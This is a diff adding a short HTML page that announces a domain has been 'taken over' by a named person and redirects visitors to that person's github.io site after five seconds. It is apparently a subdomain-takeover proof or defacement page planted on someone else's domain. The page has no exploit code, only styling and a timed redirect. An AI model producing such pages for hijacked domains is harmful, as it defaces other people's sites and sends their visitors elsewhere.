@@ -1,0 +1,48 @@
+<html>
+<head>
+    <title>Domain Takeover</title>
+    <style>
+        body {
+            background-color: black;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-size: 24px;
+            text-align: center;
+        }
+        .glass {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
+            backdrop-filter: blur(5px);
+            -webkit-backdrop-filter: blur(5px);
+            padding: 20px;
+        }
+        .rainbow-text {
+            background: linear-gradient(270deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #8b00ff);
+            background-size: 400% 400%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: rainbow 5s ease infinite;
+        }
+        @keyframes rainbow {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+    </style>
+    <script>
+        setTimeout(function() {
+            window.location.href = "https://alahimajnurosama.github.io";
+        }, 5000);
+    </script>
+</head>
+<body>
+    <div class="glass">
+        <div class="rainbow-text">This Domain Is Taken Over by Alahi Majnur Osama</div>
+    </div>
+</body>
+</html>
